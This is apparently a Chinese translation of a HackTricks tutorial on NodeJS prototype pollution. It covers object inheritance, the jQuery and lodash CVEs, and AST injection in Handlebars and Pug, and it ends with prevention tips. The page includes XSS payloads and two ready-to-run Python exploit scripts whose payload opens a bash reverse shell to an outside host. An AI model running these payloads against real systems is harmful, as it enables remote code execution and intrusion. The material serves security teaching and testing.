# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## JavaScript中的对象 <a href="#053a" id="053a"></a>

首先，我们需要了解JavaScript中的`Object`。对象简单地是键值对的集合，通常称为对象的属性。例如：

![](<../../../.gitbook/assets/image (389) (1).png>)

在JavaScript中，`Object`是一个基本对象，用于所有新创建的对象的模板。可以通过将`null`传递给`Object.create`来创建一个空对象。然而，新创建的对象也将具有与传递的参数相对应的类型，并继承所有基本属性。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

之前我们学习到，在JavaScript中，对象是键和值的集合，因此`null`对象就是一个空字典：`{}`

## JavaScript中的函数/类 <a href="#55dd" id="55dd"></a>

在JavaScript中，类和函数的概念是相互关联的（函数本身充当类的构造函数，实际上JavaScript中没有“类”的概念）。让我们看下面的例子：
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript中的原型 <a href="#3843" id="3843"></a>

需要注意的一点是，在执行代码时，原型属性可以被更改/修改/删除。例如，可以动态添加类的函数：

![](<../../../.gitbook/assets/image (363).png>)

类的函数也可以被修改（如`toString`或`valueOf`的情况）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 继承

在基于原型的程序中，对象从类中继承属性/方法。这些类是通过向另一个类的实例添加属性/方法或将它们添加到空对象来派生的。

请注意，如果向用作一组对象原型的对象（如`myPersonObj`）添加属性，则它是原型的对象也会获得新属性，但除非明确调用，否则不会打印该属性。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ 污染 <a href="#0d0a" id="0d0a"></a>

您应该已经了解到**JavaScript中的每个对象只是键值对的集合**，并且**每个对象都继承自JavaScript中的Object类型**。这意味着，如果您能够污染Object类型，**环境中的每个JavaScript对象都将被污染！**

这相当简单，您只需要能够修改任意JavaScript对象的一些属性（键值对），因为每个对象都继承自Object，所以每个对象都可以访问Object模式。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
从前面的示例中，可以使用以下方式访问对象的结构：
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
因此，正如之前提到的，如果现在向对象方案添加了一个属性，那么每个 JavaScript 对象都将可以访问到这个新属性：
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
所以现在每个JS对象将包含新属性：函数`printHello`和新常量`globalconstant`

## 原型污染

这种技术不像之前的那种有效，因为你无法污染JS对象的结构。但在**禁止使用关键字`__proto__`的情况下，这种技术可能会有用**。

如果你能够修改函数的属性，你可以修改函数的`prototype`属性，**在这里添加的每个新属性都将被该函数创建的每个对象继承：**
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
在这种情况下，只有从`person`类创建的对象会受到影响，但它们现在将继承`sayHello`和`newConstant`属性。

**有两种滥用原型污染以污染每个JS对象的方法。**

第一种方法是污染**Object**的原型属性（正如之前提到的，每个JS对象都继承自此对象）：
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
如果你成功做到了，每个JS对象将能够执行函数 `sayBye`。

另一种方法是毒化字典变量构造函数的原型，就像下面的例子一样：
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
在执行该代码后，**每个JS对象将能够执行函数 `sayHey`**。

## 污染其他对象

### 从一个类到 Object.prototype

在一个场景中，你可以**污染一个特定对象**并且需要**访问 `Object.prototype`**，你可以使用类似以下代码进行搜索：
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 数组元素污染

请注意，正如您可以污染JS对象的属性一样，如果您可以访问污染一个数组，您也可以**污染数组的值**，这些值可以通过**索引**访问（请注意，您无法覆盖值，因此您需要污染某种方式使用但未写入的索引）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html元素污染

在通过JS生成HTML元素时，可以**覆盖** **`innerHTML`** 属性，使其编写**任意HTML代码。** [灵感和示例来自此解说](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 例子

### 基本示例

那么原型污染出现在哪里呢？当应用程序中存在漏洞，使得可以覆盖 `Object.prototype` 的属性时，原型污染就会发生。由于每个典型对象都从 `Object.prototype` 继承其属性，我们可以改变应用程序的行为。最常见的示例如下：
```javascript
if (user.isAdmin) {   // do something important!}
```
假设我们有一个原型污染，使得可以设置 `Object.prototype.isAdmin = true`。然后，除非应用程序明确分配任何值，`user.isAdmin` 总是为 true！

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

例如，`obj[a][b] = value`。如果攻击者可以控制 `a` 和 `value` 的值，那么他只需要将 `a` 的值调整为 `__proto__`（在 JavaScript 中，`obj["__proto__"]` 和 `obj.__proto__` 是完全等效的），那么应用程序中所有现有对象的属性 `b` 将被分配为 `value`。

然而，根据[论文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf)，攻击并不像上面那样简单，我们只能在满足以下三个条件之一时进行攻击：

* 执行递归合并
* 按路径定义属性
* 克隆对象

### 覆盖函数
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## 客户端原型污染到 XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: 通过 jQuery $ .extend 进行原型污染攻击

$ .extend，如果处理不当，可以更改对象 `prototype`（应用程序中对象的模板）的属性。然后，这个属性将出现在所有对象上。请注意，只有“深层”版本（即 g）的 $ .extend 受到影响。

程序员经常使用此函数来复制对象或从默认对象中填充新属性。例如：

我们可以想象 `myObject` 是来自用户的输入字段，并被序列化到数据库中。

在这段代码中，我们经常认为，在运行时会将属性 `isAdmin` 分配给新创建的对象。但实质上，它直接分配给 `{}`，然后 `{}.isAdmin` 将是 `true`。如果在此代码之后，我们执行以下检查：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
如果用户尚不存在（`undefined`），将在其父对象中搜索属性`isAdmin`，该父对象是在上面添加了值为`true`的`isAdmin`的对象。

在执行JQuery 3.3.1时的另一个示例：
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
### CVE-2018–3721, CVE-2019–10744: 通过lodash进行原型污染攻击

[Lodash](https://www.npmjs.com/package/lodash)也是一个知名的库，提供了许多不同的函数，帮助我们更方便、更整洁地编写代码，每周下载量超过1900万次。它也遇到了与JQuery相同的问题。

**CVE-2018–3721**

**CVE-2019–10744**

这个漏洞影响所有版本的Lodash，在版本4.17.11中已修复。

### 另一个带有CVE的教程

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### NodeJS中的AST原型污染

NodeJS广泛利用JavaScript中的抽象语法树（AST）来实现诸如模板引擎和TypeScript等功能。本节探讨了与模板引擎（特别是Handlebars和Pug）中原型污染相关的漏洞。

#### Handlebars漏洞分析

Handlebars模板引擎可能会被利用进行原型污染。漏洞主要存在于`javascript-compiler.js`文件中的`appendContent`和`pushSource`函数中，其中`appendContent`会在存在`pendingContent`时连接`pendingContent`，而`pushSource`在推送源码后将`pendingContent`设置为`undefined`。

##### 利用过程

利用涉及操纵Handlebars生成的AST。过程如下：

1. **解析器操纵**：解析器通过`NumberLiteral`节点强制值为数字。但是，这可以通过原型污染绕过，允许插入非数字字符串。
2. **编译器处理**：编译器接受AST对象或模板字符串。如果`input.type`为`Program`，则认为输入已经预解析，可能导致利用。
3. **代码注入**：通过操纵`Object.prototype`，可以将任意代码注入模板函数，可能导致远程代码执行。

Handlebars漏洞利用示例：
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
上述代码演示了攻击者如何将任意代码注入Handlebars模板。

**外部参考**: [与'flat'库中原型污染相关的问题](https://github.com/hughsk/flat/issues/105)

Python中原型污染的示例：
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug漏洞

与Handlebars类似，Pug也可以通过原型污染进行利用。更多信息请参阅[Pug中的AST注入](https://blog.p6.is/AST-Injection/#Pug)。

Pug中原型污染的示例：
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### 预防措施

为了减少原型污染的风险，请考虑以下策略：

1. **对象不可变性**：利用 `Object.freeze` 使 `Object.prototype` 不可变。
2. **输入验证**：根据应用程序的模式严格验证 JSON 输入。
3. **安全合并函数**：避免不安全地使用递归合并函数。
4. **无原型对象**：使用 `Object.create(null)` 创建没有原型属性的对象。
5. **使用 Map**：选择 `Map` 而不是 `Object` 用于键值对。
6. **库更新**：定期更新库以整合安全补丁。



## 参考资料

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想看到您的 **公司在 HackTricks 中做广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
